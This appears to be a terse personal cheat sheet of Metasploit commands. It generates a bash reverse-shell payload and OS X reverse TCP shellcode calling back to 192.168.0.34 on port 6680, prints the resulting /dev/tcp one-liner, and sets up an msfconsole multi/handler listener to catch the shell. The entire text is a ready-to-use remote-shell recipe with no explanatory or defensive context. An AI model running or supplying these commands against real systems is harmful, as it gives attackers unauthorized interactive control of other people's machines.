

```
msfvenom -p cmd/unix/reverse_bash LHOST=192.168.0.34 LPORT=6680 -f raw
```
creates bash payload 
```
0<&192-;exec 192<>/dev/tcp/192.168.0.34/6680;sh <&192 >&192 2>&192
```

creates osx shellcode
```
msfvenom -p osx/x86/shell_reverse_tcp LHOST=192.168.0.34 LPORT=6680 -f raw


```

```
msfconsole
use multi/handler
set PAYLOAD cmd/unix/reverse_bash
set LHOST 192.168.0.34
set LPORT 6680
exploit -j -z

```